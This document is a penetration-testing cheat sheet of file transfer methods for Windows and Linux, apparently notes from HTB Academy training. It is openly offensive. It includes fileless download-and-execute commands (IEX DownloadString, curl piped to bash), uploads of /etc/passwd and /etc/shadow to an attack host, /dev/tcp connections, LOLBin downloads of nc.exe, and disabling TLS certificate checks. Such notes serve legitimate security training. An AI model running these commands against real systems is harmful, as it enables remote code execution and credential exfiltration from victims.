# Windows
                
                
                
## PowerShell Base64 Encode & Decode

If we have access to a terminal, we can encode a file to a base64 string, copy its contents and perform the reverse operation, decoding the file in the original content.

! check md5sum first just to verify file is the same later

```
$ md5sum id_rsa

$ cat id_rsa |base64 -w 0;echo
```
We copy and paste it into a PowerShell terminal and use decode it.
```
PS > [IO.File]::WriteAllBytes("C:\Users\Public\{file_name}", [Convert]::FromBase64String("base64_string"))
```

Calculate the md5sum in target
```

     PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

! cmd.exe has a maximum string length of 8,191 characters


                
## PowerShell Web Downloads (HTTP/HTTPS)

    
In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:


|    Method 	      |              Description|
|------------------|----------------------------|
OpenRead 	       |     Returns the data from a resource as a Stream.
OpenReadAsync 	       | Returns the data from a resource without blocking the calling thread.
DownloadData 	      |  Downloads data from a resource and returns a Byte array.
DownloadDataAsync 	|    Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile 	      |  Downloads data from a resource to a local file.
DownloadFileAsync 	 |   Downloads data from a resource to a local file without blocking the calling thread.
|DownloadString 	      |  Downloads a String from a resource and returns a String.|
|DownloadStringAsync 	|Downloads a String from a resource without blocking the calling thread.|

## PowerShell .DownloadFile Method


We can specify the class Net.WebClient and the method DownloadFile to download the file.

```
PS > (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS > (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
     
## PowerShell DownloadString - Fileless Method

Fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

```
PS > IEX (New-Object Net.WebClient).DownloadString('url')
```

#### IEX also accepts pipeline input.

```
PS > (New-Object Net.WebClient).DownloadString('url') | IEX
```


## PowerShell Invoke-WebRequest

    You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

```
    PS > Invoke-WebRequest url -OutFile outfile.ps1
```

[other powershell downoad methods](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

    

## Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
This can be bypassed using the parameter -UseBasicParsing.

```
    PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
    
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

    !"The underlying connection was closed: Could not establish trust

```
    PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```



 ## SMB Downloads

#### create an SMB server (Anonymous)

```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```


to download a file from the SMB server to the current working directory, we can use the following command:

```
C:\ > copy \\192.168.220.133\share\nc.exe
```

#### Create the SMB Server with a Username and Password

```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```
C:\htb> net use n: \\192.168.220.133\share /user:test test
```




## FTP Downloads


We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

#### configure an FTP Server
```
$ sudo pip3 install pyftpdlib

```
pyftpdlib uses port 2121 by default . Anonymous authentication is enabled by default if we don't set a user and password.

```
$ sudo python3 -m pyftpdlib --port 21

PS > (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')

```

#### Non interactive shell
When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
```
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous

    ftp> GET file.txt
    ftp> bye
```
            
            
            
            
## Upload Operations

#### PowerShell Base64 Encode & Decode

    Encode File Using PowerShell
```    
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

```
    
    
## PowerShell Web Uploads

We'll need a web server that accepts uploads, which is not a default option in most common webserver utilities.
    
For our web server, we can use uploadserver, an extended module of the Python HTTP.server module.

```    
$ pip3 install uploadserver
$ python3 -m uploadserver
```
    Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## PowerShell Base64 Web Upload
    
Use  Invoke-WebRequest or Invoke-RestMethod together with Netcat to listen in on a port we specify and send the file as base64 encoded body to a POST request. 

```
PS > $b64 = [System.convert]::ToBase64String((Get-Content -Path 'path/to/file' -Encoding Byte))

PS > Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```
$ nc -lvnp 8000
```


## SMB Uploads


#### WebDAV
run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other.

    !!!When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. 


To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot
```
$ sudo pip install wsgidav cheroot
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
Connecting to the Webdav Share
```
C:\> dir \\192.168.49.128\DavWWWRoot
```


    !!!Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

            
## Uploading Files using SMB

```
C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
    !Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.



## FTP Uploads

start the FTP Server using pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.

```
    $ sudo python3 -m pyftpdlib --port 21 --write
```

```
    PS > (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


## LOLBINS

#### Upload with certreq.exe

```C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini```

#### Download with bitsadmin

```PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe```

```PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"```

#### Download with certutil

```C:\htb> certutil.exe -urlcache -verifyctl -split -f http://10.10.10.32:8000/nc.exe  nc64.exe```


## User Agent changing

```
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

#### Listing user agents

```PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl```

# Linux

                    

## Download with wget/curl
```    
$ wget <url> -O <outfile>
```

! the output filename option  here is lowercase `-o'.

```
$ curl -o <outfile> <url>
```

## Fileless Attacks Using Linux


Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

!Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.


#### Fileless Download with cURL

```
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless Download with wget

```
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


##  Download with Bash (/dev/tcp)


#### simple tcp connection
```
$ exec 3<>/dev/tcp/10.10.10.32/80
```


#### HTTP GET Request
```    
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
$ cat <&3
```

## SSH Downloads

#### Enabling the SSH Server

```
$ sudo systemctl enable ssh

$ sudo systemctl start ssh

```


#### Downloading Files Using SCP
```
$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

    

## Upload Operations

#### Configure http/https server
```
$ python3 -m pip install --user uploadserver
```
#### Pwnbox - Create a Self-Signed Certificate

```
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

```
    !The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.


#### Fire Up webserver
```
    $ mkdir https && cd https
```
```
    $ python3 -m uploadserver 443 --server-certificate /path/to/certificate
```

#### Upload files from linux machine


```
    $ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
- We used the option --insecure because we used a self-signed certificate that we trust.


## Some webserver solutions

#### PHP
```$ php -S 0.0.0.0:8000```

#### Ruby 

```$ ruby -run -ehttpd . -p8000```

#### File Upload using SCP

```$ scp /etc/passwd username@192.168.49.128:/home/plaintext/```

- Note: Remember that scp syntax is similar to cp or copy.
    


## Programming languages

## Python3
```
$ python3 -c 'import urllib.request;urllib.request.urlretrieve("url", "outputfile")'
```

#### Uploading a File Using a Python One-liner

- Start the server
```
$ python3 -m uploadserver
```
- Upload from client
```
$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```




## PHP
```
$ php -r '$file = file_get_contents("url"); file_put_contents("output_filename",$file);'
```


#### PHP Download with Fopen()
```
$ php -r 'const BUFFER = 1024; $fremote =  fopen("url", "rb"); $flocal = fopen("filename", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

#### PHP Download a File and Pipe it to Bash

```
$ php -r '$lines = @file("url"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


## Perl 
```
$ perl -e 'use LWP::Simple; getstore("url", "filename");'
```
## JavaScript


```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

C:\htb> cscript.exe /nologo wget.js "url" "filename"


## VBScript

```
                dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
                dim bStrm: Set bStrm = createobject("Adodb.Stream")
                xHttp.Open "GET", WScript.Arguments.Item(0), False
                xHttp.Send

                with bStrm
                        .type = 1
                        .open
                        .write xHttp.responseBody
                        .savetofile WScript.Arguments.Item(1), 2
                end with
```

#### csscript.exe
```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```




# Netcat

#### attack box connects to server(compromised host)

- from the compromised machine:
```$ nc -l -p 8000 > file.exe```

or

```$ ncat -l -p 8000 --recv-only > file.exe```

- From our attack host : The option -q 0 will tell Netcat to close the connection once it finishes.

```$ nc -q 0 192.168.49.128 8000 < file.exe```

or

```$ ncat --send-only 192.168.49.128 8000 < file.exe```


#### the compromised machine connects back to the attack machine

- from the attack machine:

```$ sudo nc -l -p 443 -q 0 < file.exe```

or
```$ sudo ncat -l -p 443 --send-only < file.exe```

- from the compromised:

```$ nc 192.168.49.128 443 > file.exe```

or

```$ ncat 192.168.49.128 443 --recv-only > file.exe```

! The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. 
        
#### Compromised Machine Connecting Using /dev/tcp to Receive the File

```$ cat < /dev/tcp/192.168.49.128/443 > file.exe```

## PowerShell Session File Transfer (PSRemoting)



To create a PowerShell Remoting session on a remote computer, we will need one of :
- administrative access
-  be a member of the Remote Management Users group
- or have explicit permissions for PowerShell Remoting in the session configuration




#### Confirm WinRM port TCP 5985 is Open on DATABASE01.

```PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985```

  


#### Create a PowerShell Remoting Session to DATABASE01

```PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01```


#### Copy file to the DATABASE01 Session

```PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

 ```       PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session```



## RDP

#### Mounting a Linux Folder Using rdesktop

```        $ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'```

#### Mounting a Linux Folder Using xfreerdp
```$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer```

        !To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.

        




# Enabling webservers


#### enabling uploads with nginx

- Create a Directory to Handle Uploaded Files

```$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory```

- Change the Owner to www-data

```$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory```

- Create Nginx Configuration File : Create the Nginx configuration file  /etc/nginx/sites-available/upload.conf with the contents:
```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

- Symlink our Site to the sites-enabled Directory

```$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/```

- Start Nginx

```$ sudo systemctl restart nginx.service```

        !If we get any error messages, check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.

```$ tail -2 `/var/log/nginx/error.log````

- Remove NginxDefault Configuration if u get errors about the port 

```$ sudo rm /etc/nginx/sites-enabled/default```

        Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt

#### Upload File Using cURL

```$ curl -T /etc/passwd```
```$ tail -1 /var/www/uploads/SecretUploadDirectory/users.txt ```

Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.



    
                





